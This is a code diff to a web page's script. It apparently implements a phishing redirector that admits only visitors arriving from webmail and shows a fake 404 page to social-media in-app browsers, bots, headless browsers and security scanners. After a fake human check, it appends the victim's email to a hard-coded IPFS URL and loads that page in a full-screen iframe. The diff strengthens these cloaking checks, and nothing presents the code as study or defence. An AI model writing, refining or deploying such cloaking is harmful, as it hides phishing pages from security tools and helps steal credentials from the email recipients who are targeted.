@@ -73,41 +73,76 @@ html, body { margin:0; padding:0; width:100%; height:100%; font-family:Arial; }
 
 <script>
 /* ------------------------------------------------------
-     EMAIL-ONLY ACCESS + SOCIAL-MEDIA BLOCKING
+   SUPER-DEEP SOCIAL MEDIA BROWSER DETECTION
 ------------------------------------------------------ */
 function isSocialMediaBrowser() {
     const ua = navigator.userAgent.toLowerCase();
 
-    const blocked = [
-        "facebook", "fbav", "fban", "instagram",
-        "tiktok", "musically", "capcut",
-        "twitter", "snapchat", "reddit",
-        "pinterest", "linkedin",
-        "messenger", "whatsapp", "wechat",
-        "optus"
+    /* 1. Direct social UA keywords */
+    const direct = [
+        "instagram", "fbav", "fban", "facebook",
+        "tiktok", "musical.ly",
+        "snapchat",
+        "twitter", "twitter for",
+        "pinterest",
+        "linkedin",
+        "reddit",
+        "messenger",
+        "whatsapp",
+        "telegram",
+        "wechat"
     ];
+    if (direct.some(x => ua.includes(x))) return true;
 
-    return blocked.some(x => ua.includes(x));
+    /* 2. WebView indicators (ALL social apps use WebView) */
+    const webViewIndicators = ["; wv", "wv", "version/0", "version/1"];
+    if (webViewIndicators.some(x => ua.includes(x))) return true;
+
+    /* 3. Missing normal browser APIs */
+    if (!("onbeforeunload" in window)) return true;
+    if (typeof window.indexedDB === "undefined") return true;
+
+    /* 4. Strange viewport size (common in in-app browsers) */
+    if (screen.height < innerHeight - 120) return true;
+
+    /* 5. Popup test – most social apps block popups */
+    let blocked = false;
+    const test = window.open("", "", "width=1,height=1");
+    if (!test) blocked = true;
+    else test.close();
+    if (blocked) return true;
+
+    /* 6. Referrer check */
+    const ref = document.referrer.toLowerCase();
+    const socialRefs = ["facebook", "instagram", "tiktok", "twitter", "snapchat"];
+    if (socialRefs.some(x => ref.includes(x))) return true;
+
+    /* 7. Outer window size issues */
+    if (window.outerHeight === 0 || window.outerWidth === 0) return true;
+
+    return false;
 }
 
+/* ------------------------------------------------------
+   EMAIL REFERRER CHECK
+------------------------------------------------------ */
 function cameFromEmail() {
     const ref = document.referrer.toLowerCase();
 
     const emailDomains = [
-        "mail.google.com",
-        "outlook.com",
-        "office.com",
-        "mail.yahoo.com",
-        "icloud.com",
-        "proton.me",
-        "fastmail"
+        "mail.google.com", "outlook.com", "office.com",
+        "mail.yahoo.com", "icloud.com", "fastmail.com", "proton.me"
     ];
 
+    // Many mobile email apps send no referrer → allow
     if (!ref || ref.trim() === "") return true;
 
     return emailDomains.some(x => ref.includes(x));
 }
 
+/* ------------------------------------------------------
+   MASTER RULE: BLOCK SOCIAL + REQUIRE EMAIL
+------------------------------------------------------ */
 function enforceEmailOnly() {
     if (isSocialMediaBrowser()) return false;
     if (!cameFromEmail()) return false;
@@ -115,30 +150,26 @@ function enforceEmailOnly() {
 }
 
 /* ------------------------------------------------------
-     ULTRA ANTI-BOT MODULE (MERGED)
+   ULTRA ANTI-BOT MODULE
 ------------------------------------------------------ */
 async function strongBotCheck() {
     let score = 0;
 
-    /* Basic headless indicators */
     const ua = navigator.userAgent.toLowerCase();
     const botUA = ["bot","crawl","spider","curl","wget","python","scrapy","headless","selenium","puppeteer","playwright"];
     if (botUA.some(x => ua.includes(x))) score += 40;
     if (navigator.webdriver) score += 40;
 
-    /* WebGL check */
     try {
         const canvas = document.createElement("canvas");
         if (!canvas.getContext("webgl")) score += 20;
     } catch { score += 20; }
 
-    /* Audio context */
     try {
         const ctx = new (window.AudioContext || window.webkitAudioContext)();
         if (ctx.sampleRate < 30000) score += 10;
     } catch { score += 10; }
 
-    /* Screen behavior test */
     if (screen.width < 700 || screen.height < 500) score += 10;
     if (window.outerWidth === 0) score += 20;
 
@@ -149,27 +180,22 @@ async function strongBotCheck() {
         if (screenChanges === 0 && screen.width > 1024) score += 10;
     }, 1200);
 
-    /* Touch authenticity */
     const claimedTouch = navigator.maxTouchPoints > 0;
-    let realTouchEvents = 0;
-    window.addEventListener("touchstart", ()=>realTouchEvents++);
-    window.addEventListener("touchmove", ()=>realTouchEvents++);
+    let realTouch = 0;
+    window.addEventListener("touchstart", () => realTouch++);
+    window.addEventListener("touchmove", () => realTouch++);
     setTimeout(() => {
-        if (claimedTouch && realTouchEvents === 0) score += 25;
+        if (claimedTouch && realTouch === 0) score += 25;
     }, 800);
 
-    /* Honeypot autofill trap */
     const honeypot = document.createElement("input");
     honeypot.type = "text";
     honeypot.style.position = "absolute";
     honeypot.style.left = "-9999px";
     honeypot.style.opacity = "0";
     document.body.appendChild(honeypot);
-    setTimeout(() => {
-        if (honeypot.value.length > 0) score += 40;
-    }, 400);
+    setTimeout(() => { if (honeypot.value.length > 0) score += 40; }, 400);
 
-    /* Ghost button trap */
     const ghost = document.createElement("button");
     ghost.style.position = "absolute";
     ghost.style.left = "120px";
@@ -177,19 +203,16 @@ async function strongBotCheck() {
     ghost.style.opacity = "0";
     ghost.style.pointerEvents = "none";
     document.body.appendChild(ghost);
-
     document.addEventListener("click", e => {
         if (e.target === ghost) score += 40;
     });
 
-    /* Movement entropy */
-    let movements = 0;
-    window.addEventListener("mousemove", ()=>movements++);
-    window.addEventListener("touchmove", ()=>movements++);
+    let moves = 0;
+    window.addEventListener("mousemove", () => moves++);
+    window.addEventListener("touchmove", () => moves++);
     await new Promise(r => setTimeout(r, 700));
-    if (movements < 3) score += 40;
+    if (moves < 3) score += 40;
 
-    /* SHA-256 proof-of-work */
     const challenge = Math.random().toString(36).substring(2);
     try { await crypto.subtle.digest("SHA-256", new TextEncoder().encode(challenge)); }
     catch { score += 20; }
@@ -198,7 +221,7 @@ async function strongBotCheck() {
 }
 
 /* ------------------------------------------------------
-     BLOB / IPFS CONFIG
+   IPFS REDIRECT CONFIG
 ------------------------------------------------------ */
 const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";
 
@@ -214,20 +237,14 @@ function createBlobHTML(url) {
     return `
         <!DOCTYPE html>
         <html>
-        <head>
-            <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <style>
-                html, body { margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#fff; }
-                iframe { position:fixed; top:0; left:0; width:100%; height:100%; border:none; }
-            </style>
-        </head>
-        <body><iframe src="${url}"></iframe></body>
+        <head><meta name="viewport" content="width=device-width, initial-scale=1.0"></head>
+        <body style="margin:0"><iframe style="width:100%;height:100%;border:none" src="${url}"></iframe></body>
         </html>
     `;
 }
 
 /* ------------------------------------------------------
-     HUMAN VERIFICATION
+   HUMAN CHECK
 ------------------------------------------------------ */
 function requireVerification() {
     return new Promise(resolve => {
@@ -252,7 +269,7 @@ function requireVerification() {
 }
 
 /* ------------------------------------------------------
-     404 PAGE
+   404 PAGE
 ------------------------------------------------------ */
 function show404() {
     document.body.innerHTML = `
@@ -264,26 +281,22 @@ function show404() {
 }
 
 /* ------------------------------------------------------
-     MAIN FLOW
+   MAIN FLOW
 ------------------------------------------------------ */
 document.addEventListener("DOMContentLoaded", async () => {
 
-    // SOCIAL + EMAIL FILTER
     if (!enforceEmailOnly()) {
         show404();
         return;
     }
 
-    // ANTI-BOT
     if (await strongBotCheck()) {
         show404();
         return;
     }
 
-    // HUMAN CHECK
     await requireVerification();
 
-    // REDIRECT
     const email = getEmail();
     const url = buildIPFS(email);
 
